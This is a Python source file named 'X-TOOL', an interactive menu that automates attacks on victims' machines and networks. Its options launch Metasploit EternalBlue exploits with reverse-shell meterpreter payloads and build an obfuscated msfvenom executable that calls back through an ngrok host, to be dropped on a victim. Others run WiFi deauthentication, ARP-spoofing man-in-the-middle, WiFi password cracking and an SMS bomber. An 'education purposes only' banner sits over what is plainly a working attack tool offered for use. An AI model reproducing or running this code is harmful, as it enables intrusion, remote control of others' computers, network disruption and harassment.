#-- coding: utf8 --
#!/usr/bin/env python3
import os, time
logo = '''
            __  __          _____ ___   ___  _     
            \ \/ /         |_   _/ _ \ / _ \| |    
             \  /   _____    | || | | | | | | |    
             /  \  |_____|   | || |_| | |_| | |___ 
            /_/\_\           |_| \___/ \___/|_____|
            ######################################
            # Use it for EDUCATION PURPOSES only #                        
            ######################################
'''
print(logo)
Interface = input('[*]Write Name of your Internet Access Interface, (Example: wlan0):')
print('')
print('[*]Make sure for you installed this programs!')       #Programs and Tools must be installed.
print('[*]Metasploit Framework')
print('[*]Aircrack-ng')
print('[*]Ngrok')
print('[*]postgresql')
print('[*]Wifite')
print('[*]This exploit/windows/smb/ms17_010_psexec, You must download this from network and copy file in Metasploit folder/smb')
print('')
print('')
print('[*] X-TOOL Exploits:')
print('[1] Eternal Blue')
print('[2] Eternal Blue Win10')
print('[3] Deauth WiFi network')                                             #Exploits
print('[4] Meterpreter Over Wan')
print('[5] MITM Attack (Man in the middle Attack) (Using MITMf)')
print('[6] Crack Wifi network password!')
print('[7] SMS Mass Mailer')
print('')
query = input("[*] Choose exploit!:").lower()                                       
if query.startswith('1'):
	print('Check and remember Victim IP!')
	print('CTRL + C to Stop Scaning!')
	time.sleep(3)
	Ipcheck = ('netdiscover -i ') + (Interface)
	os.system(Ipcheck)
	Victim = input('[*]Write Victim IP!:')
	print('Check and remember your local IP!:')
	time.sleep(3)
	Ipcheck2 = ('ifconfig ') + (Interface)
	os.system(Ipcheck2)
	Local = input('[*]Write your Local IP address!:')	
	EternalBlue = ('msfconsole  -q -x "use exploit/windows/smb/ms17_010_eternalblue; set rhost ') + (Victim) + ('; set lhost ') + (Local) + ('; set payload windows/x64/meterpreter/reverse_tcp; exploit"')
	os.system(EternalBlue)
if query.startswith('2'):
	print('')
	print('Check and remember Victim IP!')
	print('CTRL + C to Stop Scaning!')
	time.sleep(5)
	Ipcheck = ('netdiscover -i ') + (Interface)
	os.system(Ipcheck)
	Victim2 = input('[*]Write Victim IP!:')
	User = input('Write Target Username!:')
	Pass = input('Write Target Password!:')
	EternalBlueWin10 = ('msfconsole  -q -x "use exploit/windows/smb/ms17_010_psexec; set rhost ') + (Victim2) + ('; set SMBUser ') + (User) + ('; set SMBPass ') + (Pass) + (';exploit"')
	os.system(EternalBlueWin10)
if query.startswith('3'):
	print('')
	print('Check and remember bssid and Channel of Target network!')
	print('CTRL + C to stop Scan!')
	time.sleep(5)
	WifiDump = ('airodump-ng ') + (Interface)
	os.system(WifiDump)
	WifiChannel = input('Write Channel of Target Network!:')
	bssid = input('Write bssid of Target Network!:')
	iwconfig = ('iwconfig') + (' ') + (Interface) + (' ') + ('channel') + (' ') + (WifiChannel)
	os.system(iwconfig)
	aireplay = ('aireplay-ng -0 0 -a ') + (bssid) + (' ') + (Interface)
	os.system(aireplay)
if query.startswith('4'):
	print('')
	print('Check and remember Ngrok PORT!')
	print('Dont close Ngrok window!')
	os.system("xterm -hold -e ngrok tcp 4444 &")
	NgrokPort = input('Write Ngrok Port!:')
	PayloadFile = input('What name of file you want? (Dont forget to write .exe):')
	msfvenom = ('msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=') + (NgrokPort) + (' -b "\\x00" -e x86/shikata_ga_nai -f exe -o') + (PayloadFile)
	os.system(msfvenom)
	print('Payload File locate on your Desktop! Drop this to Victim Machine!')
	postgresql = ('service postgresql start')
	os.system(postgresql)
	msfMeter = ('msfconsole  -q -x "set payload windows/meterpreter/reverse_tcp; set lhost 0.0.0.0; set LPORT 4444; use multi/handler; exploit"')
	os.system(msfMeter)
if query.startswith('5'):
	print('')
	print('Check and remember gateway IP!')
	os.system('netstat -rn')
	time.sleep(3)
	RouterIP = input('Enter Gateway IP!:')
	MITM = ('python mitmf.py -i ') + (Interface) + (' --spoof --arp --gateway ') + (RouterIP) + (' --upsidedownternet')
	os.system(MITM)
if query.startswith('6'):
	print('You must put your dict in X-TOOL folder!')
	dictionary = input('Enter name of dictionary file!:')
	Cracking = ('wifite --dict ') + (dictionary)
	os.system(Cracking)
if query.startswith('7'):
	print("Welcome to SMS Mailer!")
	print("Spoofer was writen by TheSpeedX")
	time.sleep(5)
	os.system("cd && cd X-TOOL && cd TBomb/ && chmod +x * && ./TBomb.sh")
	print("Messages Sended!")
else:
	print('')
	print('[X] Sorry, You didnt choose options!')